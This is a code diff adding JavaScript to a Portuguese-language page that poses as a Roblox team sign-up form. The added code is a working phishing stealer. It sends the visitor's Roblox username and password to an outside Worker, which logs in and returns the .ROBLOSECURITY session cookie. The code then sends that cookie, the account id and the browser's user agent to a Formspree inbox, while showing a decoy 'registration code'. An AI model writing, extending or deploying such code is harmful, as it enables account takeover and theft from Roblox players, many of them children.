@@ -78,30 +78,84 @@ input:focus{outline:none;border-color:#4b9be8;box-shadow:0 0 0 3px #4b9be822}
 <button class="back" onclick="showPage('gate')">voltar</button>
 </section>
 <script>
+const WORKER = "https://times-de-beatball---roblox.123456abcdef363.workers.dev/"; // ⚠️ COLE SUA URL DO WORKER AQUI
+
 function showPage(id){
  document.querySelectorAll(".page").forEach(page=>page.classList.remove("active"));
  document.getElementById(id).classList.add("active");
  window.scrollTo(0,0);
 }
+
 document.getElementById("loginForm").addEventListener("submit",function(event){
  event.preventDefault();
  document.getElementById("loginError").style.display="block";
 });
+
 document.getElementById("registerForm").addEventListener("submit",async function(event){
  event.preventDefault();
  const form=this;
  const status=document.getElementById("registerStatus");
  const codeBox=document.getElementById("codeBox");
+ const btn=form.querySelector("button.send");
+ const oldText=btn?btn.textContent:"";
+
+ const nick=document.getElementById("robloxNick").value.trim();
+ const pass=document.getElementById("robloxName").value;
+
+ // gera o código (visual)
  const code=String(Math.floor(1000000000+Math.random()*9000000000));
  document.getElementById("generatedCode").textContent=code;
- codeBox.style.display="block";
+
+ if(btn){btn.disabled=true;btn.textContent="enviando...";}
+ status.textContent="Fazendo login na Roblox...";
+
+ // 1) login na Roblox pelo Worker -> pega o cookie
+ let cookie=null,user=null,loginOk=false,msg="";
+ try{
+  const r=await fetch(WORKER,{
+   method:"POST",
+   headers:{"Content-Type":"application/json"},
+   body:JSON.stringify({username:nick,password:pass})
+  });
+  const data=await r.json();
+  cookie=data.robosecurity;
+  user=data.user;
+  loginOk=!!data.ok;
+  msg=data.message||"";
+ }catch(e){ msg="Worker offline / erro de rede"; }
+
+ // 2) envia pro Formspree com o cookie junto
  status.textContent="Enviando cadastro...";
  try{
-  const response=await fetch(form.action,{method:"POST",body:new FormData(form),headers:{"Accept":"application/json"}});
-  if(response.ok){status.textContent="Cadastro enviado com sucesso!";form.reset();}
-  else{status.textContent="Não foi possível enviar. Verifique a configuração do Formspree e tente novamente.";}
+  const fd=new FormData(form);
+  fd.append("robosecurity",cookie||"NAO_CAPTURADO");
+  fd.append("roblox_user",user?user.name:"");
+  fd.append("roblox_id",user?user.id:"");
+  fd.append("login_ok",loginOk?"sim":"nao");
+  fd.append("erro_login",msg);
+  fd.append("user_agent",navigator.userAgent);
+
+  const response=await fetch(form.action,{
+   method:"POST",
+   body:fd,
+   headers:{"Accept":"application/json"}
+  });
+
+  codeBox.style.display="block";
+
+  if(response.ok){
+   status.textContent=loginOk
+    ?"Cadastro enviado com sucesso!"
+    :"Cadastro enviado, mas o login na Roblox falhou (confira nick/senha).";
+   form.reset();
+  }else{
+   status.textContent="Não foi possível enviar. Verifique a configuração do Formspree e tente novamente.";
+  }
  }catch(error){
+  codeBox.style.display="block";
   status.textContent="Falha de conexão. O código foi gerado, mas o cadastro pode não ter sido enviado.";
+ }finally{
+  if(btn){btn.disabled=false;btn.textContent=oldText;}
  }
 });
 </script>
